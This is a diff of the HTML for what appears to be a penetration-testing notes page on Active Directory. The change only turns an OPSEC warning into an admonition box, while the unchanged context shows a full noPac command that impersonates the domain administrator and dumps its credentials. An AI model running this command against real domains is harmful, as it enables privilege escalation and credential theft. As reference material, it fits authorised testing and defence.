@@ -3777,9 +3777,9 @@ nxc:
 </span></code></pre></div>
 <div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">sudo</span> <span class="n">python3</span> <span class="n">noPac</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s1">&#39;pass&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span>  <span class="n">-dc-host</span> <span class="n">DC01</span> <span class="p">-</span><span class="n">-impersonate</span> <span class="n">administrator</span> <span class="n">-use-ldap</span> <span class="n">-dump</span> <span class="n">-just-dc-user</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">administrator</span>
 </span></code></pre></div></p>
-<blockquote>
-<p>[!important] OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution.</p>
-</blockquote>
+<div class="admonition alert">
+<p class="admonition-title">OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution.</p>
+</div>
 
 
 
